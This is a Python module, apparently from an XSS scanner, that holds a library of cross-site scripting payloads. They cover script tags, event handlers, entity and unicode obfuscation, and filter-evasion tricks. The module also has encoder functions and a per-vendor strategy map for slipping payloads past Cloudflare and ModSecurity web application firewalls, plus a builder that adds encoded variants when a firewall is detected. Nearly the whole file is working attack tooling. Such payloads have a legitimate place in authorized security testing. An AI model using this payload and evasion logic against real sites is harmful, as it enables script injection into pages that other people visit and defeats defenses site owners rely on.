import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote

CLASSIC: List[str] = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "javascript:alert(1)",
    "<iframe src=\"javascript:alert(1)\">",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<form action=\"javascript:alert(1)\"><button>x</button></form>",
    "<svg><script>alert(1)</script></svg>",
    "<img src=x onerror=alert(1)>",
]

EVENT_HANDLERS: List[str] = [
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<body onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)><option>1</option></select>",
    "<textarea autofocus onfocus=alert(1)>x</textarea>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<div onmouseover=alert(1)>x</div>",
    "<button onfocus=alert(1)>x</button>",
    "<body onpageshow=alert(1)>",
    "<frameset onload=alert(1)>",
    "<div draggable=\"true\" ondragstart=alert(1)>x</div>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributeName=x to=1>",
    "<x onpointerenter=alert(1)>x</x>",
]

HTML_ENTITIES: List[str] = [
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "<a href=\"jav&#x61;script:alert(1)\">x</a>",
    "javas&#99;ript:alert(1)",
]

UNICODE_OBFUSCATION: List[str] = [
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<script>alert\\u00281\\u0029</script>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<scr\x00ipt>alert(1)</script>",
    "<script >alert(1)</script >",
    "<script\n>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<sCrIpT>alert(1)</sCrIpT>",
]

WAF_EVASION: List[str] = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "\"><svg onload=alert(1)>//",
    "'\"><img src=x onerror=alert(1)>",
    "javascript://comment%0aalert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<table background=\"javascript:alert(1)\">",
    "<div style=\"width:expression(alert(1))\">",
    "<img src=x onerror=\"alert(1)\" //",
]

PAYLOAD_LIBRARY: Dict[str, List[str]] = {
    'classic': CLASSIC,
    'event_handlers': EVENT_HANDLERS,
    'html_entities': HTML_ENTITIES,
    'unicode': UNICODE_OBFUSCATION,
    'waf_evasion': WAF_EVASION,
}

STANDARD_SET: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<video src=x onerror=alert(1)>",
    "<ScRiPt>alert(1)</ScRiPt>",
]

MAX_PAYLOADS = 48


def dedupe(items: List[str]) -> List[str]:
    seen = set()
    out = []
    for item in items:
        if item not in seen:
            seen.add(item)
            out.append(item)
    return out


def all_payloads() -> List[str]:
    merged: List[str] = []
    for group in PAYLOAD_LIBRARY.values():
        merged.extend(group)
    return dedupe(merged)


def load_custom_wordlist(path: str) -> List[str]:
    with open(path, 'r', encoding='utf-8', errors='ignore') as handle:
        return parse_wordlist_text(handle.read())


def parse_wordlist_text(text: str) -> List[str]:
    lines = [ln.strip() for ln in text.splitlines()]
    return dedupe([ln for ln in lines if ln and not ln.startswith('#')])


def enc_url(payload: str) -> str:
    return quote(payload, safe='')


def enc_double_url(payload: str) -> str:
    return quote(quote(payload, safe=''), safe='')


def enc_html_entity(payload: str) -> str:
    table = {'<': '&#60;', '>': '&#62;', '"': '&#34;', "'": '&#39;', '&': '&#38;'}
    return ''.join(table.get(ch, ch) for ch in payload)


def enc_hex_entity(payload: str) -> str:
    table = {'<': '&#x3c;', '>': '&#x3e;', '"': '&#x22;', "'": '&#x27;'}
    return ''.join(table.get(ch, ch) for ch in payload)


def enc_unicode(payload: str) -> str:
    table = {'<': '\\u003c', '>': '\\u003e', '(': '\\u0028', ')': '\\u0029'}
    return ''.join(table.get(ch, ch) for ch in payload)


def enc_case_swap(payload: str) -> str:
    def swap(match: re.Match) -> str:
        tag = match.group(0)
        return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(tag))
    return re.sub(r'</?[A-Za-z]+', swap, payload)


def enc_nested_strip(payload: str) -> str:
    return payload.replace('script', 'scr<script>ipt')


def enc_whitespace(payload: str) -> str:
    return payload.replace(' ', '\t')


def enc_null_byte(payload: str) -> str:
    return payload.replace('<', '<\x00')


ENCODERS: Dict[str, Any] = {
    'url_encode': enc_url,
    'double_url_encode': enc_double_url,
    'html_entity': enc_html_entity,
    'hex_entity': enc_hex_entity,
    'unicode_escape': enc_unicode,
    'case_swap': enc_case_swap,
    'nested_strip': enc_nested_strip,
    'whitespace': enc_whitespace,
    'null_byte': enc_null_byte,
}

STRATEGY_MAP: Dict[str, List[str]] = {
    'cloudflare': ['html_entity', 'unicode_escape', 'case_swap'],
    'modsecurity': ['url_encode', 'nested_strip', 'whitespace'],
    'generic': ['url_encode', 'html_entity', 'case_swap'],
}


def encode_payload(payload: str, strategy: str) -> str:
    encoder = ENCODERS.get(strategy)
    return encoder(payload) if encoder else payload


def pick_strategies(vendor: Optional[str]) -> List[str]:
    return STRATEGY_MAP.get(vendor or 'generic', STRATEGY_MAP['generic'])


def build_payload_set(mode: str = 'standard', waf_detected: bool = False,
                      waf_vendor: Optional[str] = None,
                      custom: Optional[List[str]] = None) -> Tuple[List[str], Dict[str, int]]:
    if custom:
        base = custom
    elif mode == 'full':
        base = all_payloads()
    else:
        base = STANDARD_SET

    base = dedupe(base)
    encoded_count = 0

    if waf_detected:
        variants = []
        for payload in base[:8]:
            for strategy in pick_strategies(waf_vendor):
                variants.append(encode_payload(payload, strategy))
        encoded_count = len(variants)
        base = base + variants

    final = dedupe(base)[:MAX_PAYLOADS]
    meta = {
        'base': len(base) - encoded_count,
        'encoded': encoded_count,
        'total': len(final),
    }
    return final, meta